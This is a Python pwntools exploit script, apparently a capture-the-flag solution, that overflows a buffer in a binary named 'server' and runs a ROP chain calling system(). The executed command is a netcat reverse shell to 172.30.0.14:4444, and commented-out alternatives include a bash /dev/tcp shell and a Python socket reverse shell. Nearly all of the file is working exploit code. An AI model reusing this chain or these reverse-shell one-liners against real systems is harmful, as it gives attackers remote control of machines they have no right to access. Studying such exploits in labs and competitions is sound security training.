#!/usr/bin/env python2
## -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./server')
argv = []

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 6210)

def launch():
    return remote(host, port)

p = launch()

"""
payload = ''
payload += p32(0x6c-4)  # offset to our buffer
payload += p64(0x040504E)  # system@plt
payload += 'y' *8 + 'x'*(400-16) + 'zzzzzzzz'
payload = p32(len(payload)-8) + payload # whole length
print(`payload`)
""" # some old payload that was executing system but wasn't useful

payload = ''
payload += p32(0x6c-4)  # offset to our buffer
payload += p64(0x0000000000410362)  # gadget that does add rsp, 0x50, sets  some regs and does ret

# ROP starts here; some regs are set but we don't use them at the end
rop = ''
rop = p64(0xdeadbabe)  # RBX
rop += p64(0xdeadbabe) # RBP
rop += p64(0xdeadbabe) # R12
rop += p64(0xdeadbabe) # R13

# Some old gadget I was testing but didn't use at the end
"""
rop += p64(0x00000000004021ce) #: pop rdi; ret; 
rop += p64(5) # RDI === our/client sockfd

rop += p64(0x0000000000409362) #: pop rcx; add rsp, 0x18; pop rbx; pop rbp; ret; 
rop += p64(0)
rop += p64(0x4343434343434343) * 3
rop += p64(0x4242424242424242) # RBX
rop += p64(0x4141414141414141) # RBP

rop += p64(0x00000000004bb28e) #: pop rdx; ret; 
rop += p64(100)



# RDX = size
# RCX = flags (???)
# RDI = fd
# RSI = buf
rop += p64(0x0000000000401A30) # jmp _send (send plt)
"""

###### interesting gadgets I used in the end!
# 0x000000000040e7ed: add rax, rdx; ret; 
# 0x0000000000409073: pop rax; ret; 
# 0x00000000004097be: mov rdi, rax; call qword ptr [rax + 0x78]; 

# The RAX value was adjusted to get a proper value somewhere later :P
rop += p64(0x0000000000409073) #: pop rax; ret; 
rop += p64(0xfffffffffffffb60) # RAX
rop += p64(0x000000000040e7ed) #: add rax, rdx; ret; 
rop += p64(0x00000000004097be) #: mov rdi, rax; call qword ptr [rax + 0x78]; 


# Some revshells I tested... 172.30.0.14 == our ip in vpn
cmd = "nc -e /bin/sh 172.30.0.14 4444"
#cmd = "bash -i >& /dev/tcp/172.30.0.14/4444 0>&1"
#cmd = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.30.0.14",4444));os.dup2(s.fileno(),5); os.dup2(s.fileno(),5); os.dup2(s.fileno(),5);p=subprocess.call(["/bin/sh","-i"]);''"""
#cmd = 'ping 172.30.0.14'
rop += cmd
rop += '\x00' * (0x78 - len(cmd))
rop += p64(0x0401A10)  # jumps to _system if i recall  correctly

# alignment for rop
assert len(rop) <= 400
payload += rop
payload += 'x'*(400 - len(rop))
payload = p32(len(payload)-8) + payload # whole length

# Debug print ftw
print(`payload`)

p.send(payload)

p.interactive()
